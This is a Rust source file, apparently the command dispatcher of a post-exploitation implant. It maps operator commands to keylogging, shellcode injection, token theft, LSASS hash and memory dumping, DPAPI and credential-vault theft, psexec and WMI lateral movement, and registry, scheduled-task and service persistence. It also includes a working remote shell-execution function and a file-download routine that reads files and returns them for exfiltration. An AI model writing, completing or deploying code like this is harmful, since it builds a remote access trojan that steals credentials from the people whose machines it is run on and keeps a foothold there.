pub mod creds;
pub mod inject;
pub mod lateral;
pub mod lsass;
pub mod persist;
pub mod recon;
pub mod token;

use anyhow::Result;

/// Dispatch a command string to the matching post-ex module.
pub async fn dispatch(command: &str, args: &[String]) -> Result<String> {
    match command {
        "shell"       => shell(args).await,
        "ls"          => recon::ls(args.first().map(|s| s.as_str()).unwrap_or(".")).await,
        "ps"          => recon::ps().await,
        "whoami"      => recon::whoami().await,
        "ipconfig"    => recon::ipconfig().await,
        "portscan"    => recon::portscan(args).await,
        "screenshot"  => recon::screenshot().await,
        "keylog"      => recon::keylog_start().await,
        "inject"      => inject::inject_shellcode(args).await,
        "migrate"     => inject::migrate(args).await,
        "token_steal" => token::steal(args).await,
        "make_token"  => token::make(args).await,
        "rev2self"    => token::rev2self().await,
        "hashdump"    => lsass::hashdump().await,
        "minidump"    => lsass::minidump(args).await,
        "creds_vault" => creds::vault().await,
        "creds_dpapi" => creds::dpapi(args).await,
        "psexec"      => lateral::psexec(args).await,
        "wmi_exec"    => lateral::wmi_exec(args).await,
        "reg_persist" => persist::registry(args).await,
        "schtask"     => persist::schtask(args).await,
        "service"     => persist::service(args).await,
        "upload"      => upload(args).await,
        "download"    => download(args).await,
        "cd"          => { if let Some(dir) = args.first() { std::env::set_current_dir(dir)?; } Ok("ok".into()) }
        "pwd"         => Ok(std::env::current_dir()?.to_string_lossy().into_owned()),
        "sleep"       => {
            if let Some(ms) = args.first().and_then(|s| s.parse::<u64>().ok()) {
                tokio::time::sleep(tokio::time::Duration::from_millis(ms)).await;
            }
            Ok("ok".into())
        }
        "kill"        => std::process::exit(0),
        _             => Err(anyhow::anyhow!("unknown command: {command}")),
    }
}

async fn shell(args: &[String]) -> Result<String> {
    if args.is_empty() { return Err(anyhow::anyhow!("no command")); }
    #[cfg(target_os = "windows")]
    let out = tokio::process::Command::new("cmd.exe")
        .args(["/c", &args.join(" ")])
        .output().await?;
    #[cfg(not(target_os = "windows"))]
    let out = tokio::process::Command::new("sh")
        .args(["-c", &args.join(" ")])
        .output().await?;
    let stdout = String::from_utf8_lossy(&out.stdout).into_owned();
    let stderr = String::from_utf8_lossy(&out.stderr).into_owned();
    Ok(format!("{stdout}{stderr}"))
}

async fn upload(args: &[String]) -> Result<String> {
    // args[0] = remote path, body comes via a separate file transfer channel
    Ok(format!("upload stub: {:?}", args))
}

async fn download(args: &[String]) -> Result<String> {
    if let Some(path) = args.first() {
        let data = tokio::fs::read(path).await?;
        return Ok(hex::encode(data));
    }
    Err(anyhow::anyhow!("no path"))
}
